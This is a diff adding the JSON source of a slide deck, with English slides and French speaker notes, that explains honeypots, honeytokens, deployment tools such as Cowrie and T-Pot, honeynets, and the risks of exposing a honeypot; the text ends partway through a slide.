@@ -1,0 +1,898 @@
+{
+    "title": "Build Your Own Honeypot for Threat Detection, Attack Analysis, and Threat Intelligence",
+    "keywords": [
+        "honeypots",
+        "honeytokens",
+        "threat detection",
+        "threat intelligence",
+        "attacker analysis",
+        "deception technology",
+        "cybersecurity"
+    ],
+    "description": "Learn how honeypots and honeytokens detect cyber threats, collect threat intelligence, analyze attacker behavior, and strengthen defensive security through practical demonstrations and real-world case studies.",
+    "author": "Maurice Lambert",
+    "default icon": "https://mauricelambert.github.io/MauriceLambert.png",
+    "default icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+    "default aside": "References: <a href=\"https://github.com/mauricelambert/\">Github MauriceLambert</a>, <a href=\"https://mauricelambert.github.io/\">MauriceLambert WebSite</a>.",
+    "slides": [
+        {
+            "type": "title",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Why Use Honeypots for Threat Detection ?",
+            "notes": [
+                "Dans cette partie, nous allons chercher \u00e0 comprendre ce que sont les pi\u00e8ges ou les techniques de tromperie en cybers\u00e9curit\u00e9 d\u00e9fensive ainsi que les raisons de les utiliser et les situations dans lesquelles ils sont pertinents."
+            ]
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Why Use Honeypots for Threat Detection and Cyber Threat Intelligence ?",
+            "notes": [
+                "Les syst\u00e8mes de cybers\u00e9curit\u00e9 utilisent les techniques et les outils connus pour \u00eatre employ\u00e9s lors de cyberattaques afin de d\u00e9tecter et de g\u00e9n\u00e9rer des alertes de s\u00e9curit\u00e9. Pour cela, il est n\u00e9cessaire de bien conna\u00eetre ces outils et ces techniques. Le meilleur moyen d'y parvenir est probablement d'observer les cyberattaquants.",
+                "Il est \u00e9galement int\u00e9ressant de comprendre les menaces : quels sont leurs objectifs, comment elles m\u00e8nent leurs op\u00e9rations, d'o\u00f9 elles proviennent, etc. Ces analyses n\u00e9cessitent d'observer le comportement des acteurs de la menace.",
+                "Les honeypots (pots de miel) permettent d'attirer les attaquants vers des syst\u00e8mes volontairement vuln\u00e9rables afin d'observer leurs comportements, leurs techniques et leurs outils."
+            ],
+            "aside": "References: <a href=\"https://csrc.nist.gov/pubs/sp/800/94/final\">NIST SP 800-94 \u2013 Guide to Intrusion Detection and Prevention Systems (IDPS)</a>, <a href=\"https://www.techtarget.com/searchsecurity/definition/honey-pot\">TechTarget \u2013 What is a Honeypot ?</a>.",
+            "image": "honeypot_cyber.jpg",
+            "image alt": "Honey pot representing a cybersecurity honeypot with a digital network background and cyber defense theme",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Security tools can only detect <strong>what they already know</strong>, making it necessary to observe and collect new attack techniques and malware used by cyber attackers."
+                },
+                {
+                    "type": "p",
+                    "content": "Understanding cyber attackers <strong>requires observing their behavior</strong>, objectives, and methods during their activities."
+                },
+                {
+                    "type": "p",
+                    "content": "A honeypot is a deliberately exposed system designed to attract attackers and <strong>record every interaction</strong>."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Honeypots vs. Honeytokens: What's the Difference ?",
+            "notes": [
+                "Les d\u00e9fenseurs ont besoin de d\u00e9tecter les cyberattaques et les acteurs de la menace. Pour cela, ils peuvent pi\u00e9ger les cyberattaquants avec des donn\u00e9es sp\u00e9cifiques.",
+                "Le principe est de concevoir des alertes sur l'acc\u00e8s ou l'utilisation de certaines donn\u00e9es.",
+                "Si honeypots et honeytokens sont tous les deux des pi\u00e8ges, les honeypots sont des syst\u00e8mes principalement utilis\u00e9s pour observer alors que les honeytokens sont des donn\u00e9es qui permettent de recevoir une alerte et de pr\u00e9venir d'une cyberattaque en cours ou pass\u00e9e.",
+                "J'ai d\u00e9j\u00e0 eu un client qui utilisait un honeypot pour lever des alertes, ce syst\u00e8me a des limites car en tant qu'infog\u00e9reur nous devions effectuer des actions sur la machine et \u00e0 chaque connexion il recevait un faux positif. Pour de la d\u00e9tection je pense qu'un honeytoken est plus efficace.",
+                "La pr\u00e9sentation parlera plus de honeypots que de honeytokens mais nous \u00e9voquerons le sujet pour les b\u00e9n\u00e9fices qu'ils apportent."
+            ],
+            "aside": "References: <a href=\"https://faculty.nps.edu/dedennin/publications/honeyfiles.pdf\">Honeyfiles: Deceptive Files for Intrusion Detection \u2013 IEEE Workshop on Information Assurance 2004</a>.",
+            "image": "honeytoken_alert_meme.jpg",
+            "image alt": "Cybersecurity meme showing a safe house under observation with a telescope versus a burning compromised system after a honeytoken trigger",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Sometimes, defenders need to know <strong>what an attacker accesses</strong>, what they are looking for, or even <strong>their position within the information system</strong>."
+                },
+                {
+                    "type": "p",
+                    "content": "A honeytoken is a fake digital asset, such as a file, credential, API key, or database record, designed to <strong>trigger an alert</strong> whenever it is accessed or used."
+                },
+                {
+                    "type": "p",
+                    "content": "Unlike honeypots, which simulate vulnerable systems to <strong>observe attacker interactions</strong>, honeytokens are passive decoys that <strong>reveal unauthorized access</strong> to specific resources."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "What Can We Learn from Honeypot Data ?",
+            "notes": [
+                "Les honeypots permettent de r\u00e9cup\u00e9rer des informations sur l'attaque comme:",
+                "Les tendances et les statistiques sur les campagnes du moment.",
+                "Des IOCs comme les IP, les hashes des malwares, les domaines des C2, ...",
+                "Les outils et techniques que les attaquants utilisent pour compromettre les syst\u00e8mes.",
+                "Les d\u00e9tails d'une campagne de malware qui permettrait d'identifier les acteurs, les objectifs et les fa\u00e7ons d'op\u00e9rer.",
+                "Parfois il est possible d'obtenir des techniques et outils sur les mouvements lat\u00e9raux qui permettent d'identifier des cibles privil\u00e9gi\u00e9es pour certaines campagnes."
+            ],
+            "aside": "References: <a href=\"https://technav.ieee.org/topic/honey-pot-computing/\">Honey Pot (computing) \u2013 IEEE Technology Navigator</a>, <a href=\"https://www.projecthoneypot.org/statistics.php\">Statistics - ProjectHoneyPot</a>.",
+            "image": "honeypots_statistics.svg",
+            "image alt": "Honeypot attack statistics dashboard showing the top countries for harvesting, spam sending, dictionary attacks, and comment spam activity",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Honeypots collect detailed information about attacker activity, providing insights into:"
+                },
+                {
+                    "type": "ul",
+                    "content": [
+                        "<strong>Attack trends and statistics</strong>: Measure attack volumes, sources, targeted services, and changes over time.",
+                        "<strong>Indicators of Compromise (IOCs)</strong>: Collect malicious IP addresses, domains, files, hashes, and other artifacts.",
+                        "<strong>Attacker tools and techniques</strong>: Identify the tools used by attackers and analyze their Tactics, Techniques, and Procedures (TTPs).",
+                        "<strong>Malware campaigns</strong>: Identify and understand malware campaigns targeting exposed systems.",
+                        "<strong>Lateral movement</strong>: Detect attempts to access additional systems after initial compromise."
+                    ]
+                }
+            ],
+            "code": "Project Statistics (as of August 02 2026)\n\nTime From Harvest To First Spam\n# Slowest: 3 years, 4 months, 2 weeks, 3 days, 21 hours, 1 min, 31 secs\n# Fastest: 1 sec\n# Average: 2 weeks, 5 days, 11 hours, 49 mins, 41 secs\n\nHarvester Traffic: 2.69% of all honey pot visitors are harvesters\n\nSpams Sent\n# 912.0 messages to the average spam trap address\n# 4,019,502 messages sent to the most targeted trap\n\nSpam Servers Per Harvester: \t119.4 spam servers per harvester\n\nMonitoring\n# 143,230,677 IPs\n# 528,447,413 spam traps\n\nIdentified\n# 914,630 harvesters\n# 2,176,250 search engines\n# 109,237,268 spam servers\n# 1,328,893 comment spammers\n# 28,749,305 dictionary attackers\n# 37,248 rule breakers\n# 1,577,771 bad web hosts\n\nActive (This Week)\n# 1,644 harvesters\n# 16,660 spam servers\n# 60 comment spammers\n# 4,657 dictionary attackers\n# 0 rule breakers\n# 2,520 bad web hosts\n\nReceived\n# 3,869,640,741 unique spam messages\n# 403,947 unique messages this week\n\nMonitoring Capability: 321,295,000,000 spam traps\n\nTop-5 Countries For Harvesting:\n#1 [China] China (28.1%)\n#2 [United States] United States (22.5%)\n#3 [Spain] Spain (4.1%)\n#4 [Great Britain] Great Britain (3.1%)\n#5 [India] India (3.1%)\n\nTop-5 Countries For Spam Sending:\n#1 [China] China (10.5%)\n#2 [Brazil] Brazil (8.2%)\n#3 [United States] United States (7.7%)\n#4 [Russia] Russia (6.6%)\n#5 [India] India (5.7%)\n\nTop-5 Countries For Dictionary Attacks:\n#1 [China] China (10.6%)\n#2 [India] India (10.2%)\n#3 [Brazil] Brazil (7.7%)\n#4 [Russia] Russia (6.6%)\n#5 [Vietnam] Vietnam (6.3%)\n\nTop-5 Countries For Comment Spamming:\n#1 [China] China (29.1%)\n#2 [United States] United States (16.4%)\n#3 [Russia] Russia (9.9%)\n#4 [Brazil] Brazil (4.2%)\n#5 [Ukraine] Ukraine (3.8%)",
+            "code lang": "Statistics from projecthoneypot"
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Who Uses Honeypots and Why ?",
+            "notes": [
+                "Il y a 3 acteurs principaux qui utilisent ces pi\u00e8ges:",
+                "Les acteurs de la recherche en cybers\u00e9curit\u00e9, ils \u00e9tablissent des statistiques et des tendances \u00e0 partir des donn\u00e9es r\u00e9colt\u00e9es avec les honeypots. Parfois ils font des recherches sur les comportements des attaquants comme les premi\u00e8res actions men\u00e9es ou les actions pr\u00e9f\u00e9r\u00e9es des cyberattaquants.",
+                "Les entreprises de cybers\u00e9curit\u00e9 recherchent de nouveaux exploits, des IOCs (IP, hashes, domaines), parfois des nouveaux samples de malwares connus ou des am\u00e9liorations de malwares. Parfois, ils peuvent mettre la main sur de nouveaux acteurs, de nouveaux outils et de nouvelles campagnes \u00e0 bloquer.",
+                "Les \u00e9quipes de d\u00e9tection (les \u00e9quipes de d\u00e9fense, les SOC) utilisent des pi\u00e8ges pour savoir s'ils ont \u00e9t\u00e9 compromis ou si une compromission est en cours."
+            ],
+            "aside": "References: <a href=\"https://arxiv.org/abs/2512.05321\">A Practical Honeypot-Based Threat Intelligence Framework for Cyber Defence in the Cloud</a>.",
+            "image": "attack_map.jpeg",
+            "image alt": "Cyberattack infection chain diagram illustrating the different stages of a malware infection from initial access to execution",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "<strong>Universities and research laboratories</strong> use honeypots to study attack trends, global threat activity, attacker behaviors, and geographic distribution."
+                },
+                {
+                    "type": "p",
+                    "content": "<strong>Security companies</strong> use honeypots to discover new malware campaigns, emerging exploits, attacker infrastructure, and new threats."
+                },
+                {
+                    "type": "p",
+                    "content": "<strong>Security teams</strong> mainly use honeytokens and <strong>deception techniques</strong> to detect unauthorized access and generate <strong>high-confidence alerts</strong>."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "title",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "How Honeypots and Honeytokens Work for Threat Detection and Cyber Deception",
+            "notes": [
+                "Nous allons maintenant regarder ce que sont concr\u00e8tement les honeypots et les honeytokens et comment ils fonctionnent."
+            ]
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "How Honeypots Capture and Monitor Cyber Attacks",
+            "notes": [
+                "Le honeypot est un service expos\u00e9, souvent vuln\u00e9rable.",
+                "L'attaquant pourra tenter de se connecter dessus et d'exploiter la vuln\u00e9rabilit\u00e9.",
+                "Toutes les interactions sont monitor\u00e9es et peuvent \u00eatre analys\u00e9es par les \u00e9quipes de d\u00e9fense ou de recherche qui souhaitent obtenir des informations."
+            ],
+            "aside": "References: <a href=\"https://d3fend.mitre.org/technique/d3f%3ADecoyEnvironment/\">Decoy Environment (D3-DE)</a>.",
+            "image": "malicious_script.webp",
+            "image alt": "Malicious script recovered from a honeypot for cybersecurity analysis",
+            "texts": [
+                {
+                    "type": "ol",
+                    "content": [
+                        "A honeypot deliberately <strong>exposes one or more services</strong> that appear to be legitimate targets for cyber attackers.",
+                        "<strong>Once an attacker discovers the exposed service</strong>, they interact with it by scanning, authenticating, exploiting vulnerabilities, or executing malicious actions.",
+                        "Every <strong>interaction is monitored and recorded</strong>, allowing defenders to analyze the complete attack process without interrupting the attacker."
+                    ]
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "cards",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Choosing the Right Honeypot: Low, Medium, or High Interaction",
+            "notes": [
+                "Il existe 3 types de honeypots:",
+                "Les honeypots de faible interaction: ils exposent simplement des services non vuln\u00e9rables, vous pourrez r\u00e9cup\u00e9rer les attaques de bruteforce, les IP sources, des statistiques... C'est facile \u00e0 mettre en place et il y a tr\u00e8s peu de risque.",
+                "Les honeypots d'interaction moyenne vont \u00e9muler des syst\u00e8mes, par exemple un shell bash sous SSH, vous pourrez capturer des actions de l'attaquant. Ce ne sont pas de vrais syst\u00e8mes donc les interactions restent limit\u00e9es, c'est plus dangereux que les faibles interactions mais c'est relativement simple \u00e0 mettre en place et monitorer.",
+                "Les honeypots de haute interaction sont de vrais syst\u00e8mes vuln\u00e9rables, ils sont tr\u00e8s dangereux mais permettent une interaction compl\u00e8te, ce sont ceux qui donnent le plus de r\u00e9sultats mais consommateurs en temps et en infrastructure.",
+                "Vous pourriez imaginer un syst\u00e8me de haute interaction, avec une vuln\u00e9rabilit\u00e9 maitris\u00e9e et un syst\u00e8me de protection et \u00e9mulation d\u00e9di\u00e9, c'est plus r\u00e9aliste pour la reconnaissance de l'attaquant moins pour l'exploitation mais attention la dangerosit\u00e9 d\u00e9pend de la qualit\u00e9 de votre protection. A moins de maitriser totalement la vuln\u00e9rabilit\u00e9, je ne recommande pas cette technique."
+            ],
+            "aside": "References: <a href=\"https://www.mdpi.com/1999-5903/18/4/190\">A Review of Honeypots: Fingerprinting Techniques, Detection, and Evasion Mechanisms</a>.",
+            "cards": [
+                {
+                    "title": "Low-Interaction",
+                    "content": "<ul><li><strong>Simulates a basic service</strong> (SSH, FTP, HTTP, SMB...).</li>\n<li>Safe, easy to deploy, low resource usage.</li>\n<li>Limited attacker interaction and intelligence.</li></ul>"
+                },
+                {
+                    "title": "Medium-Interaction",
+                    "content": "<ul><li><strong>Emulates a realistic environment</strong>, such as a fake Linux shell.</li>\n<li>More attacker activity, moderate deployment complexity.</li>\n<li>Can be fingerprinted and provides limited realism.</li></ul>"
+                },
+                {
+                    "title": "High-Interaction",
+                    "content": "<ul><li><strong>Exposes a real vulnerable operating system</strong> or application.</li>\n<li>Maximum visibility into attacker behavior and TTPs.</li>\n<li>Higher operational risk and infrastructure requirements.</li></ul>"
+                }
+            ]
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "How Honeytokens Detect Unauthorized Access",
+            "notes": [
+                "Il y a \u00e9norm\u00e9ment d'honeytokens possibles, la seule limite pour en trouver sera votre imagination.",
+                "Vous pouvez avoir des honeytokens r\u00e9seaux comme un pare-feu qui l\u00e8ve une alerte lorsqu'un port est contact\u00e9, une application web qui l\u00e8ve une alerte lorsqu'une URL est requ\u00eat\u00e9e (comme /admin/) ou m\u00eame un sous-domaine qui serait identifi\u00e9 pour lever l'alerte par le service DNS. Dans certains cas vous pouvez cibler certaines techniques: une URL cach\u00e9e dans une page web, les interactions humaines ne permettent pas de cliquer dessus mais les crawlers eux la contacteront.",
+                "Vous pouvez d\u00e9ployer des informations d'identification qui l\u00e8vent des alertes lorsqu'elles sont utilis\u00e9es comme des cl\u00e9s d'API, des noms d'utilisateur et mots de passe, des certificats ou m\u00eame des cl\u00e9s SSH. En les ajoutant dans des scripts d'admin, encod\u00e9s en base64 vous augmentez la cr\u00e9dibilit\u00e9 du pi\u00e8ge.",
+                "Les honeytokens sous forme de fichier sont assez puissants mais peuvent lever des faux positifs sur un collaborateur un peu trop curieux. Il faut des noms et emplacements strat\u00e9giques, du faux contenu pour \u00e9viter d'\u00e9veiller les soup\u00e7ons de l'attaquant et ils peuvent \u00eatre utilis\u00e9s de deux mani\u00e8res diff\u00e9rentes: \u00e0 l'ouverture sur un syst\u00e8me pr\u00e9cis en monitorant les actions sur le syst\u00e8me de fichier ou \u00e0 l'ouverture sur des types de fichier qui le permettent: HTML, DOCX, XLSX, PDF, LNK, SVG... Cette seconde option vous permet de connaitre le contexte d'ouverture du fichier (application, IP source, ect...)",
+                "Enfin certaines informations utilis\u00e9es comme une adresse mail d\u00e9di\u00e9e, des informations bancaires pour le payement en ligne, ...",
+                "En discutant avec une red team tr\u00e8s connue en France et m\u00eame dans le monde, l'un des membres m'expliquait que les honeytokens bien faits sont probablement la source de d\u00e9tection la plus courante et la plus fiable dans leurs travaux."
+            ],
+            "aside": "References: <a href=\"https://canarytokens.org/nest/\">Canarytokens</a>.",
+            "image": "honeytoken.png",
+            "image alt": "Honeytoken alert email notification triggered on a Canarytoken subdomain for cybersecurity monitoring",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Honeytokens' primary purpose is to detect when a fake asset has been accessed or used, while recording contextual information about the access. In some cases, they can capture details such as the source IP address, application, protocol, or usage context."
+                },
+                {
+                    "type": "ul",
+                    "content": [
+                        "Network: URLs and subdomains used as honeytokens to <strong>detect the discovery phase</strong>. Tip: hidden URLs can be used to identify crawlers.",
+                        "Credentials: API keys, usernames/passwords, certificates, or SSH keys <strong>used to detect unauthorized usage</strong>. Tip: place them in scripts, configuration files, or repositories where attackers may discover them.",
+                        "Files: File access monitoring can <strong>detect any access attempt</strong>, while file opening detection can target specific formats such as PDF, DOCX, XLSX, LNK or EXE.",
+                        "Identifiers: Email addresses, credit card payment information, or other unique identifiers used to <strong>detect misuse or data leakage</strong>."
+                    ]
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "title",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Getting Started with Honeypots: Simple Deployment and Practical Tools",
+            "notes": [
+                "Certains outils existent d\u00e9j\u00e0 et sont faciles \u00e0 d\u00e9ployer, nous allons voir quelques-uns de ces outils."
+            ]
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Popular Medium-Interaction Honeypot Tools for Cyber Threat Detection",
+            "notes": [
+                "Voici quelques honeypots connus faciles \u00e0 d\u00e9ployer.",
+                "Ce sont des honeypots qui simulent des syst\u00e8mes, les actions ne devraient pas impacter votre syst\u00e8me mais peuvent impacter le contexte du syst\u00e8me (r\u00e9seau par exemple), veillez \u00e0 bien l'isoler.",
+                "La liste reste disponible dans les slides avec la description, vous pourrez l'utiliser si vous souhaitez les tester."
+            ],
+            "aside": "References: <a href=\"https://docs.cowrie.org/\">Cowrie Documentation</a>.",
+            "image": "T-Pot.png",
+            "image alt": "T-Pot honeypot ELK dashboard displaying real-time cyber attack statistics, attack sources, and security analytics",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Medium-interaction honeypots provide a good balance between deployment simplicity, security, and the amount of attacker activity that can be observed."
+                },
+                {
+                    "type": "ul",
+                    "content": [
+                        "Cowrie: <strong>SSH and Telnet honeypot</strong>. Captures login attempts, commands, and downloaded malware.",
+                        "Dionaea: <strong>Malware collection honeypot</strong>. Designed to capture malicious payloads and samples.",
+                        "OpenCanary: Lightweight <strong>multi-protocol honeypot</strong>. Supports services such as SSH, HTTP, SMB, and databases.",
+                        "Honeytrap: Generic network service honeypot for detecting and analyzing attacks.",
+                        "T-Pot: <strong>All-in-one honeypot platform</strong> integrating multiple tools: Cowrie, Dionaea, Elastic, Kibana, Suricata, SpiderFoot, and more."
+                    ]
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "image-only",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Live Demonstration: Deploying and Analyzing a Honeypot",
+            "notes": [
+                "On va faire la d\u00e9monstration d'un d\u00e9ploiement de honeypot en local."
+            ],
+            "aside": "References: <a href=\"https://github.com/cowrie/cowrie\">Cowrie repository</a>.",
+            "image": "deploy_cowrie.jpg",
+            "image alt": "Docker deployment screenshot showing a Cowrie medium-interaction honeypot container being launched quickly and easily"
+        },
+        {
+            "type": "title",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Modern Honeypots for Emerging Cyber Threats and New Attack Surfaces",
+            "notes": [
+                "Il y a maintenant de nouvelles cibles avec des attaques sp\u00e9cifiques, cela n\u00e9cessite de nouveaux honeypots."
+            ]
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Honeynets: Observing Modern Multi-Stage Attacks",
+            "notes": [
+                "Les attaques ont \u00e9volu\u00e9, avant les attaquants utilisaient beaucoup de vers et de virus pour se propager. Avec un honeypot il \u00e9tait possible de r\u00e9cup\u00e9rer le malware et de conna\u00eetre les moyens de propagation. Maintenant les attaquants pr\u00e9f\u00e8rent effectuer des mouvements lat\u00e9raux.",
+                "Pour observer des mouvements lat\u00e9raux il faut des r\u00e9seaux complets de honeypots plus r\u00e9alistes.",
+                "Ces r\u00e9seaux s'appellent des honeynets."
+            ],
+            "aside": "References: <a href=\"https://all.net/journal/deception/www.honeynet.org/project.honeynet.org/papers/honeynet/index.html\">The honeynet project.</a>.",
+            "image": "propagation.jpg",
+            "image alt": "Three-part cybersecurity diagram illustrating malware propagation through a virus, worm-based network infection, and lateral movement after account compromise",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Early malware often relied on automatic propagation mechanisms such as viruses and worms to infect other systems."
+                },
+                {
+                    "type": "p",
+                    "content": "Modern attackers increasingly perform targeted operations after the initial compromise, including reconnaissance, privilege escalation, and <strong>lateral movement across the environment</strong>."
+                },
+                {
+                    "type": "p",
+                    "content": "A <strong>honeynet</strong> connects multiple honeypots to simulate a larger environment and <strong>observe these multi-stage attacks</strong> with more realistic attack paths."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Modern Honeypots for Cloud, Containers, and IoT Environments",
+            "notes": [
+                "Les infrastructures \u00e9voluent, ce qui am\u00e8ne des attaques diff\u00e9rentes donc des attaques et des recherches diff\u00e9rentes.",
+                "Pour cela il faut de nouveaux honeypots comme Docker, Kubernetes, des syst\u00e8mes industriels et de l'IOT.",
+                "Les syst\u00e8mes industriels et l'IOT sont souvent moins prot\u00e9g\u00e9s que les serveurs internes, ce sont des cibles de choix pour les attaques automatis\u00e9es.",
+                "Des honeypots sp\u00e9cifiques \u00e0 ces infrastructures sont de plus en plus d\u00e9velopp\u00e9s."
+            ],
+            "aside": "References: <a href=\"https://www.jstage.jst.go.jp/article/ipsjjip/24/3/24_522/_article\">IoTPOT: A Novel Honeypot for Revealing Current IoT Threats</a>.",
+            "image": "malware_iot_evolution.jpg",
+            "image alt": "Chart showing the yearly growth in IoT malware targeting connected devices and cyberattacks over time",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "<strong>Modern infrastructures</strong> have expanded beyond traditional servers to include cloud platforms, containers, industrial systems, and billions of connected IoT devices."
+                },
+                {
+                    "type": "p",
+                    "content": "Unlike enterprise servers, which are now heavily monitored and protected, many <strong>IoT devices remain poorly secured</strong>, making them attractive targets for automated attacks that can spread rapidly and compromise large numbers of devices."
+                },
+                {
+                    "type": "p",
+                    "content": "To observe these evolving threats, <strong>specialized honeypots have been developed</strong> for Kubernetes, Docker, cloud platforms (AWS, Azure, GCP), IoT devices, and industrial control systems (ICS/SCADA)."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "AI-Powered Analysis for Honeypot Threat Intelligence",
+            "notes": [
+                "L'IA est une grande aide pour l'analyse des attaques, elle fait gagner beaucoup de temps en corr\u00e9lant les attaques des m\u00eames campagnes. Cela permet une r\u00e9duction de co\u00fbts de l'utilisation des honeypots."
+            ],
+            "aside": "References: <a href=\"https://dl.acm.org/doi/10.1145/3655693.3655716\">Honeypot's Best Friend ? Investigating ChatGPT's Ability to Evaluate Honeypot Logs</a>.",
+            "image": "statistics_honeypots.jpg",
+            "image alt": "HiveSecurity January 2026 honeypot statistics dashboard showing global cyberattack trends, targeted services, and malicious activity analytics",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Modern honeypots can generate <strong>thousands of events every day</strong>, making manual <strong>analysis time-consuming</strong> and expensive."
+                },
+                {
+                    "type": "p",
+                    "content": "<strong>Artificial Intelligence can automatically classify attacks</strong>, identify malware families, summarize attacker behaviors, and correlate similar incidents across multiple honeypots."
+                },
+                {
+                    "type": "p",
+                    "content": "By accelerating threat analysis, AI helps security teams reduce investigation time, improve response efficiency, and lower operational costs."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Could Honeypots Help Analyze AI-Driven Cyber Attacks ?",
+            "notes": [
+                "Les attaques 100% IA arrivent et ces attaques risquent d'\u00eatre automatis\u00e9es et d'attaquer des honeypots.",
+                "Les honeypots pourraient \u00eatre r\u00e9utilis\u00e9s massivement pour essayer de mieux comprendre ces nouvelles attaques et am\u00e9liorer les d\u00e9fenses."
+            ],
+            "aside": "References: <a href=\"https://www.anthropic.com/news/disrupting-AI-espionage\">Disrupting an AI-enabled cyber espionage campaign</a>.",
+            "image": "ia_attacks_statistics.svg",
+            "image alt": "Line chart showing phishing attack trends from 2020 to 2024, highlighting a sharp increase during the rise of generative AI followed by a decline as AI-driven cyberattacks evolved",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "<strong>AI-assisted attacks are becoming increasingly common</strong>, and fully autonomous attack campaigns may become an emerging threat for organizations with limited security capabilities."
+                },
+                {
+                    "type": "p",
+                    "content": "Unlike human attackers, AI agents may execute predefined attack workflows <strong>without questioning the authenticity of the target</strong> unless explicitly instructed to detect deception."
+                },
+                {
+                    "type": "p",
+                    "content": "If AI-driven attacks become widespread, <strong>honeypots could provide a scalable way to observe their behaviors</strong>, identify common attack patterns, and adapt defensive strategies."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "title",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Securing Honeypots: Deployment Risks and Security Best Practices",
+            "notes": [
+                "Maintenant je vais vous proposer des architectures de honeypots et vous devrez identifier s'ils sont s\u00e9curis\u00e9s."
+            ]
+        },
+        {
+            "type": "content",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
+            "icon alt": "Metallic serpent dragon logo in red to purple gradient symbolizing offensive power, high quality, mythic strength and Python-inspired security defense",
+            "title": "Exercise: Home Network Deployment",
+            "notes": [
+                "Identifiez les risques dans cette architecture."
+            ],
+            "aside": "References: <a href=\"https://github.security.telekom.com/2015/03/honeypot-tpot-concept.html\">Introduction into T-Pot: A Multi-Honeypot Platform</a>.",
+            "image": "box_honeypot.svg",
+            "image alt": "Network infrastructure diagram showing a honeypot deployed behind a router with port forwarding in a local network.",
+            "texts": [
+                {
+                    "type": "p",
+                    "content": "Identify the security risks of deploying a honeypot behind a home router and propose appropriate mitigations."
+                }
+            ],
+            "code": "",
+            "code lang": ""
+        },
+        {
+            "type": "content-left",
+            "icon": "https://mauricelambert.github.io/MauriceLambert.png",
